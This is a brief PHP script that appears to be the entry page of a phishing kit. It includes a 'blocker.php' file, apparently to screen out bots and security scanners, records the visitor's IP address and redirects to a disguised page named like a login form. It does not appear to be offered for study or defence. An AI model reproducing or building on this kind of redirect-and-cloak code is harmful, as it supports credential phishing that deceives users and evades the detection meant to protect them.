<?php
session_start();
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

header("Location: _+login=+.php?ip=$ip");
?>